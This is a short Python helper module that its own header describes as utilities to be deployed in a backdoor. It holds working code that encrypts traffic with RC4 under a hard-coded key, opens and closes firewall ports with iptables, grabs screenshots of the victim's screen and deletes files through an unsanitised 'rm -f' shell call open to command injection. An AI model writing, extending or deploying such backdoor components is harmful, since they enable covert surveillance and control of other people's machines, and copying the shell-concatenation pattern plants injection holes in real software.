__author__ = 'root'
#
# program name: utility
# description: this program contains geneal utilities would be deployed
# in backdoor
# Author: He Tian
#

import os
from Crypto.Cipher import ARC4
import pyscreenshot as ImageGrab

key = '01234567'

def encrypt(message, key):
    des = ARC4.new(key)
    return des.encrypt(message)


def decrypt(cipher_txt, key):
    des = ARC4.new(key)
    return des.decrypt(cipher_txt)

def open_port(port):
    output= 'iptables -A OUTPUT -p tcp --dport '+ str(port) + ' -j ACCEPT'
    input = 'iptables -A INPUT -p tcp --sport '+ str(port) + ' -j ACCEPT'
    os.system(output)
    os.system(input)

def release_port(port):
    output= 'iptables -D OUTPUT -p tcp --dport '+ str(port) + ' -j ACCEPT'
    input = 'iptables -D INPUT -p tcp --sport '+ str(port) + ' -j ACCEPT'
    os.system(output)
    os.system(input)

def capture(filname):
    ImageGrab.grab_to_file(filname)

def delete(filename):
    os.system("rm -f "+filename)
